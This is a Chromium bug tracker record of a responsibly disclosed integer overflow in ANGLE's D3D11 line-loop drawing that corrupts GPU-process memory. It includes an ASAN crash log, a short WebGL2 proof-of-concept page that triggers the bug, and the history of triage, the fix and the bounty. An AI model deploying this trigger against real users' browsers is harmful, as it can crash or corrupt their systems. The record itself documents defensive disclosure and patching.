# Integer overflow in libANGLE that results in memory corruption in GPU process

| Field | Value |
|-------|-------|
| **Issue ID** | [40094318](https://issues.chromium.org/issues/40094318) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Windows |
| **Reporter** | ta...@gmail.com |
| **Assignee** | jm...@chromium.org |
| **Created** | 2019-03-18 |
| **Bounty** | $3,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36

Steps to reproduce the problem:
I reproduce the issue by launching the attached PoC with ASAN build of Chromium Version 74.0.3726.0 (Developer Build) (64-bit), on latest Windows 10.

Here is the ASAN log:
=================================================================
==9228==ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges [0x12ab537b3000,0x12ac537b2ffc) and [0x12ab6e201820, 0x12ac6e20181c) overlap
    #0 0x7ff7901f507f in __asan_memcpy C:\b\rr\tmpapv6or\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_interceptors_memintrinsics.cc:22
    #1 0x7ffa61eb3797 in rx::Renderer11::drawLineLoop(class gl::Context const *,unsigned int,enum gl::DrawElementsType,void const *,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Renderer11.cpp:1752:5
    #2 0x7ffa61eb2001 in rx::Renderer11::drawArrays(class gl::Context const *,enum gl::PrimitiveMode,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Renderer11.cpp:1510:20
    #3 0x7ffa61c31148 in gl::Context::drawArraysInstanced(enum gl::PrimitiveMode,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:2184:5
    #4 0x7ffa61971650 in gl::DrawArraysInstanced(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp:464:22
    #5 0x7ffa73a0e9bd in gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArraysInstancedANGLE(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:4233:10
    #6 0x7ffa72a020c7 in gpu::gles2::GLES2DecoderPassthroughImpl::HandleDrawArraysInstancedANGLE(unsigned int,void const volatile *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_handlers.cc:1753:10
    #7 0x7ffa706e99eb in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:655:20
    #8 0x7ffa706e8de6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:593:12
    #9 0x7ffa70666e49 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:69:18
    #10 0x7ffa6dc6851c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:543:22
    #11 0x7ffa6dc67dff in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) C:\b\swarming\w\ir\cache\builder\src\ipc\ipc_message_templates.h:146:7
    #12 0x7ffa6dc6515e in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:193:7
    #13 0x7ffa6b7f583f in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:566:23
    #14 0x7ffa6b7f011a in gpu::GpuChannel::HandleMessage(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:543:3
    #15 0x7ffa6b4aca37 in gpu::Scheduler::RunNextTask(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc:529:24
    #16 0x7ffa6f9d1337 in base::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) C:\b\swarming\w\ir\cache\builder\src\base\task\common\task_annotator.cc:104:33
    #17 0x7ffa6c80cc93 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:336:21
    #18 0x7ffa6c80c4da in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:217:7
    #19 0x7ffa6c7c73f3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\swarming\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:39:55
    #20 0x7ffa6c80e4bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:403:12
    #21 0x7ffa6a6c59a2 in base::RunLoop::Run(void) C:\b\swarming\w\ir\cache\builder\src\base\run_loop.cc:157:14
    #22 0x7ffa6c5c695f in content::GpuMain(struct content::MainFunctionParams const &) C:\b\swarming\w\ir\cache\builder\src\content\gpu\gpu_main.cc:358:14
    #23 0x7ffa6a5bcb5a in content::ContentMainRunnerImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:879:10
    #24 0x7ffa6a5d284a in service_manager::Main(struct service_manager::MainParams const &) C:\b\swarming\w\ir\cache\builder\src\services\service_manager\embedder\main.cc:416:29
    #25 0x7ffa6a5bb414 in content::ContentMain(struct content::ContentMainParams const &) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main.cc:19:10
    #26 0x7ffa63861327 in ChromeMain C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_main.cc:103:12
    #27 0x7ff7901b7cdd in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) C:\b\swarming\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:202:12
    #28 0x7ff7901b2352 in main C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:229:20
    #29 0x7ff790528927 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #30 0x7ffadd5a81f3  (C:\WINDOWS\System32\KERNEL32.DLL+0x1800181f3)
    #31 0x7ffadd7ea250  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006a250)

Address 0x12ab537b3000 is a wild pointer.
0x12ab6e201820 is located 32 bytes inside of 4294967331-byte region [0x12ab6e201800,0x12ac6e201823)
allocated by thread T0 here:
    #0 0x7ff7901f43f0 in malloc C:\b\rr\tmpapv6or\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:68
    #1 0x7ffa6256e38e in operator new(unsigned __int64) d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ffa619f2d2d in std::vector<int,class std::allocator<int> >::_Resize<class `std::vector<int,class std::allocator<int> >::resize(unsigned __int64)'::`1'::<lambda_1> >(unsigned __int64,class `std::vector<int,class std::allocator<int> >::resize(unsigned __int64)'::`1'::<lambda_1>) C:\b\swarming\w\ir\cache\builder\src\third_party\depot_tools\win_toolchain\vs_files\e04af53255fe13c130e9cfde7d9ac861b9fb674a\VC\Tools\MSVC\14.16.27023\include\vector:1441:43
    #3 0x7ffa61eb2cda in rx::Renderer11::drawLineLoop(class gl::Context const *,unsigned int,enum gl::DrawElementsType,void const *,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Renderer11.cpp:1739:5
    #4 0x7ffa61eb2001 in rx::Renderer11::drawArrays(class gl::Context const *,enum gl::PrimitiveMode,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Renderer11.cpp:1510:20
    #5 0x7ffa61c31148 in gl::Context::drawArraysInstanced(enum gl::PrimitiveMode,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:2184:5
    #6 0x7ffa61971650 in gl::DrawArraysInstanced(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp:464:22
    #7 0x7ffa73a0e9bd in gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArraysInstancedANGLE(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:4233:10
    #8 0x7ffa72a020c7 in gpu::gles2::GLES2DecoderPassthroughImpl::HandleDrawArraysInstancedANGLE(unsigned int,void const volatile *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_handlers.cc:1753:10
    #9 0x7ffa706e99eb in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:655:20
    #10 0x7ffa706e8de6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:593:12
    #11 0x7ffa70666e49 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:69:18
    #12 0x7ffa6dc6851c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:543:22
    #13 0x7ffa6dc67dff in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) C:\b\swarming\w\ir\cache\builder\src\ipc\ipc_message_templates.h:146:7
    #14 0x7ffa6dc6515e in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:193:7
    #15 0x7ffa6b7f583f in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:566:23
    #16 0x7ffa6b7f011a in gpu::GpuChannel::HandleMessage(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:543:3
    #17 0x7ffa6b4aca37 in gpu::Scheduler::RunNextTask(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc:529:24
    #18 0x7ffa6f9d1337 in base::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) C:\b\swarming\w\ir\cache\builder\src\base\task\common\task_annotator.cc:104:33
    #19 0x7ffa6c80cc93 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:336:21
    #20 0x7ffa6c80c4da in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:217:7
    #21 0x7ffa6c7c73f3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\swarming\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:39:55
    #22 0x7ffa6c80e4bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:403:12
    #23 0x7ffa6a6c59a2 in base::RunLoop::Run(void) C:\b\swarming\w\ir\cache\builder\src\base\run_loop.cc:157:14
    #24 0x7ffa6c5c695f in content::GpuMain(struct content::MainFunctionParams const &) C:\b\swarming\w\ir\cache\builder\src\content\gpu\gpu_main.cc:358:14
    #25 0x7ffa6a5bcb5a in content::ContentMainRunnerImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:879:10
    #26 0x7ffa6a5d284a in service_manager::Main(struct service_manager::MainParams const &) C:\b\swarming\w\ir\cache\builder\src\services\service_manager\embedder\main.cc:416:29
    #27 0x7ffa6a5bb414 in content::ContentMain(struct content::ContentMainParams const &) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main.cc:19:10
    #28 0x7ffa63861327 in ChromeMain C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_main.cc:103:12
    #29 0x7ff7901b7cdd in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) C:\b\swarming\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:202:12

SUMMARY: AddressSanitizer: memcpy-param-overlap C:\b\rr\tmpapv6or\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_interceptors_memintrinsics.cc:22 in __asan_memcpy
==9228==ABORTING

Sorry for that the PoC is not simplified.

What is the expected behavior?

What went wrong?
I think the crash happens because of an integer overflow in libANGLE.

https://github.com/google/angle/blob/master/src/libANGLE/renderer/d3d/d3d11/Renderer11.cpp#L1724

In Renderer11::drawLineLoop,

    unsigned int spaceNeeded =
        static_cast<unsigned int>(sizeof(GLuint) * mScratchIndexDataBuffer.size()); <-- size is truncated to uint32

But later, the memcpy is performed with the untruncated size.

Did this work before? N/A 

Chrome version: 74.0.3726.0  Channel: n/a
OS Version: 10
Flash Version: 

Reported by Wen Xu of SSLab, Georgia Tech

## Attachments

- deleted (application/octet-stream, 0 B)
- [gpu.html](attachments/gpu.html) (text/plain, 121.2 KB)
- [main.cpp](attachments/main.cpp) (text/plain, 3.6 KB)

## Timeline

### cl...@chromium.org (2019-03-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5684855468851200.

### wf...@chromium.org (2019-03-18)

Thanks for the report.

I wonder if this needs a dx11 surface to trigger, because CF doesn't seem to be able to trigger.

This seems High to me. I will work on reproducing it. In the meantime, adding some libANGLE folks to get more eyes on the bug.

[Monorail components: Internals>GPU>ANGLE]

### wf...@chromium.org (2019-03-18)

Note: needs --disable-gpu-watchdog to repro.

### cl...@chromium.org (2019-03-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5194314503290880.

### pi...@chromium.org (2019-03-18)

Right, given the location of the bug, I don't think any of this is covered by our fuzzers, as it needs D3D.

### cl...@chromium.org (2019-03-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5179636016349184.

### wf...@chromium.org (2019-03-19)

I can repro same stack as report, so this is certainly a bug, but I don't think CF will be able to... Is geofflang@ the best person to deal with this?

### pi...@chromium.org (2019-03-19)

Yes, or at least triage.

### pi...@chromium.org (2019-03-19)

+jmadill for another pair of eyes

### jm...@chromium.org (2019-03-19)

That is one heck of a PoC. Will take a look tomorrow.

### ta...@gmail.com (2019-03-19)

Thanks for handling. By the way, could I know what does CF exactly mean?

### wf...@chromium.org (2019-03-19)

Sorry, CF is ClusterFuzz - https://google.github.io/clusterfuzz/

### ta...@gmail.com (2019-03-19)

Thanks heh, I just realize that. I try to use its minimizor to simplify testcases now.

### cl...@chromium.org (2019-03-19)

Testcase 5179636016349184 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5179636016349184.

### cl...@chromium.org (2019-03-19)

Testcase 5684855468851200 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5684855468851200.

### sh...@chromium.org (2019-03-19)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-03-19)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-03-19)

This is a bit tricky. I'm not sure why we're getting overlapped memory ranges in memcpy. We get an indexed line loop draw call with an index count of 0x3ffffffe. We need 0x3fffffff indices to represent the line loop. This leads to a allocating a buffer with 0xfffffffc bytes. All of this succeeds. We map the buffer successfully. Then the memcpy fails. Possibly because the map pointer we get from D3D11 is invalid.

We could arbitrarily restrict the draw call size for this edge case. But I'm not sure what code is at fault here. If it's in the D3D11 implementation or if there's something I'm missing in ANGLE.

For context the code in ANGLE is here:

https://chromium.googlesource.com/angle/angle/+/refs/heads/master/src/libANGLE/renderer/d3d/d3d11/Renderer11.cpp#1734

+Rafael from Microsoft as this is a security issue that might also affect Edge.

### ta...@gmail.com (2019-03-19)

This is the simplified PoC that can reproduce `memcpy-param-overlap` on my Windows 10 machine.

<script id="vshader" type="x-shader/x-vertex">
void main () {
}
</script>

<script id="fshader" type="x-shader/x-fragment">
#ifdef GL_ES
precision highp float;
#endif
void main() {
}
</script>
<canvas id="canvas"></canvas>
<script>
var gl = canvas.getContext('webgl2');

var vShader = gl.createShader(gl.VERTEX_SHADER);
var vShaderScript = document.getElementById('vshader');
gl.shaderSource(vShader, vShaderScript.text);
gl.compileShader(vShader);
var fShader = gl.createShader(gl.FRAGMENT_SHADER);
var fShaderScript = document.getElementById('fshader');
gl.shaderSource(fShader, fShaderScript.text);
gl.compileShader(fShader);
var program = gl.createProgram();
gl.attachShader(program, vShader);
gl.attachShader(program, fShader);
gl.linkProgram(program);
gl.useProgram(program);
gl.drawArraysInstanced(gl.LINE_LOOP, 289, 1073741822, 460);
</script>

### pi...@chromium.org (2019-03-19)

@#18: I think the bug is in ANGLE. mScratchIndexDataBuffer is resized to |count|+1 elements ([1]), which then overflows unsigned int when multiplied by sizeof(GLuint) ([2]). We can probably fix the indexCheck above ([3]), though checked math would likely be more robust.


[1] https://cs.chromium.org/chromium/src/third_party/angle/src/libANGLE/renderer/d3d/d3d11/Renderer11.cpp?type=cs&sq=package:chromium&q=getLineLoop&g=0&l=217
[2] https://cs.chromium.org/chromium/src/third_party/angle/src/libANGLE/renderer/d3d/d3d11/Renderer11.cpp?type=cs&q=drawLineLoop&g=0&l=1725
[3] https://cs.chromium.org/chromium/src/third_party/angle/src/libANGLE/renderer/d3d/d3d11/Renderer11.cpp?type=cs&q=drawLineLoop&g=0&l=1714

### pi...@chromium.org (2019-03-19)

Oh, hmm, what I described would happen with count = 2^30-1, but we get 2^30-2 in the poc that reproduces this, so I don't know.

### jm...@chromium.org (2019-03-20)

tarafans7@gmail.com could you open about:gpu on the affected test system, "Save as webpage / complete", and attach the resulting html file to this issue report? Thank you.

### ta...@gmail.com (2019-03-20)

[Comment Deleted]

### ta...@gmail.com (2019-03-20)

I attached, thanks.

### jm...@chromium.org (2019-03-20)

Thanks. I wanted to confirm you were running an NVIDIA GPU. Also thanks for the reduced test case.

### jm...@chromium.org (2019-03-20)

I've put up a small CL here:

https://crrev.com/c/1531374

It can repro pretty easily on WebGL 1. However so far it looks like the memory corruption is only reproducible on NVIDIA. Most other systems TDR which is expected from a very large draw.

### jm...@chromium.org (2019-03-20)

+Kimmo. Kimmo can you forward the reproduction case in https://crrev.com/c/1531374 to the D3D driver team? It seems like the NV driver is returning an invalid pointer from a map call.

We should work around this in ANGLE. Possibly by enabling buffer range checking in DrawArrays calls for NV.

### jm...@chromium.org (2019-03-20)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-03-20)

Tentative workaround up here:

https://chromium-review.googlesource.com/c/angle/angle/+/1531374

Will get it reviewed tomorrow when Montreal is back in the office.

### [Deleted User] (2019-03-21)

Thanks for the report.
This is nv internal https://crbug.com/chromium/2540265.

Attaching a repro case in case rafael.cintron@microsoft.com has time to suggest testing something like this in the official D3D11/D3D9 harness.

### jm...@chromium.org (2019-03-21)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/4967de7251e63fcb8846928bb6de65e46d0abd8a

commit 4967de7251e63fcb8846928bb6de65e46d0abd8a
Author: Jamie Madill <jmadill@chromium.org>
Date: Thu Mar 21 18:42:05 2019

Work around line loop streaming bug.

This forces a hard limit on the buffer size we allocate from D3D11. It
can work around a D3D11 driver bug on NVIDIA where we would get an
invalid map pointer. This seemed to happen when the buffer sizes were
close to MAX_UINT.

Bug: chromium:943087
Change-Id: I64aa9c55cbb82015101262c19c72741c140964a5
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/1531374
Commit-Queue: Jamie Madill <jmadill@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

[modify] https://crrev.com/4967de7251e63fcb8846928bb6de65e46d0abd8a/src/tests/gl_tests/LineLoopTest.cpp
[modify] https://crrev.com/4967de7251e63fcb8846928bb6de65e46d0abd8a/src/libANGLE/renderer/d3d/d3d11/ResourceManager11.cpp
[modify] https://crrev.com/4967de7251e63fcb8846928bb6de65e46d0abd8a/src/libANGLE/renderer/d3d/d3d9/Renderer9.cpp


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/77bc309e4333f7b8523d4b3fd100cd9027942f80

commit 77bc309e4333f7b8523d4b3fd100cd9027942f80
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Mar 21 21:30:55 2019

Roll src/third_party/angle f2bf49e20849..3e8a8d5b8567 (2 commits)

https://chromium.googlesource.com/angle/angle.git/+log/f2bf49e20849..3e8a8d5b8567


git log f2bf49e20849..3e8a8d5b8567 --date=short --no-merges --format='%ad %ae %s'
2019-03-21 jmadill@chromium.org Force new displays on each Windows 7 end2end test.
2019-03-21 jmadill@chromium.org Work around line loop streaming bug.


Created with:
  gclient setdep -r src/third_party/angle@3e8a8d5b8567

The AutoRoll server is located here: https://autoroll.skia.org/r/angle-chromium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.

CQ_INCLUDE_TRYBOTS=luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel

BUG=chromium:944454,chromium:943087
TBR=jmadill@chromium.org

Change-Id: I440c87a236ba78746a51bc74ca733e4f2518704d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1534431
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#643126}
[modify] https://crrev.com/77bc309e4333f7b8523d4b3fd100cd9027942f80/DEPS


### dr...@chromium.org (2019-03-28)

Friendly security sheriff ping. Any update on this? Did the CLs submitted already fix the bug?

### jm...@chromium.org (2019-04-01)

Bug should be fixed now. tarafans7@gmail.com if you have time can you confirm the crash is fixed with your ASAN build?

### sh...@chromium.org (2019-04-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-02)

This bug requires manual review: M74 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### ab...@google.com (2019-04-09)

[Empty comment from Monorail migration]

### na...@google.com (2019-04-10)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-04-10)

Congrats! The Panel decided to reward $3,000 for this report. 

A member from our finance team will be in touch shortly. 

### na...@google.com (2019-04-10)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-10)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-15)

[Empty comment from Monorail migration]

### ab...@google.com (2019-04-16)

[Empty comment from Monorail migration]

### aw...@google.com (2019-04-17)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-04-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/943087?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/951451]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094318)*
